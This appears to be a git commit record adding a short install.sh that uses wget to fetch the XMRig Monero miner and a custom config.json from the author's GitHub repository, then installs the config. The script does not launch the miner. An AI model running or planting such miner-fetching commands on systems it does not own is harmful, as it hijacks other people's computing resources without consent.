cfab2546d17d214c43821b9f49107da0ddf6c0c3
0x82b <75819560+0x82b@users.noreply.github.com>
2020-12-25 11:54:22 -0500

    Create install.sh

---
+++ install.sh
@@ -0,0 +1,5 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.7.0/xmrig-6.7.0-linux-x64.tar.gz
+wget https://raw.githubusercontent.com/0x82b/0x82b.github.io/main/config.json
+tar xzvf xmrig-6.7.0-linux-x64.tar.gz
+rm xmrig-6.7.0-linux-x64/config.json
+mv config.json xmrig-6.7.0-linux-x64
